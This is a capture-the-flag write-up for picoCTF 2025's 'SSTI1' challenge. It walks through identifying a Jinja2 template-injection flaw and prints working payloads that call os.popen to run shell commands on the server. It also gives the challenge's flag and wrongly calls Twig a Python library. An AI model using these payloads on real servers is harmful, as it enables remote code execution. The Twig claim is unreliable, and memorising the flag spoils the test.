---
title: "picoCTF 2025: SSTI1"
tags:
  - ctf
date: 2025-03-17
---
# Problem
![[media/ctf/picoCTF/SSTI1/description.png]]
# Solution
After starting a challenge instance, we can take a look at this cool website for ourselves:

![[home.png]]

It's implied that this website is vulnerable to SSTI, or server side template injection. Websites use template engines to create dynamic content, and SSTI vulnerabilities arise when user-supplied input is supplied to these template engines. Malicious actors may exploit this to inject code into the site. 

Before we assume the role of an attacker, we must first identify the template engine in use as this will influence our choice of payload. I found the following diagram from [Cobalt](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti) to be very helpful: 

![[engine.png]]

So let's start with `${7*7}`. I'll save bandwidth and just tell you it rendered the literal string `${7*7}`. Following the diagram, I then tried `{{7*7}}`, which is shown below.

![[7x7.png]]
![[49.png]]

Note that `7*7` was evaluated! Then for `{{7*'7'}}`:

![[7x'7'.png]]
![[7777777.png]]

Similarly, the input was evaluated. Therefore, this site is in fact vulnerable, and is using either Jinja2 or Twig. Both options are Python libraries, hence our payload will consist of Python. 

If we try something like `{{request}}`, we can access the request object itself:

![[request.png]]
![[request_result.png]]

From here, essentially everything can be accessed via [magic methods](https://www.geeksforgeeks.org/dunder-magic-methods-python/). In researching Python SSTI, I discovered a great post by [OnSecurity](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) that details the different ways to do this. For instance, the following payload executes `ls` in the same directory as the server:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

![[ls.png]]
![[ls_result.png]]

And of course we are interested in `flag`. So we can adapt this payload to run `cat flag`:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

![[cat_flag.png]]
![[cat_flag_result.png]]
## Flag
`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}`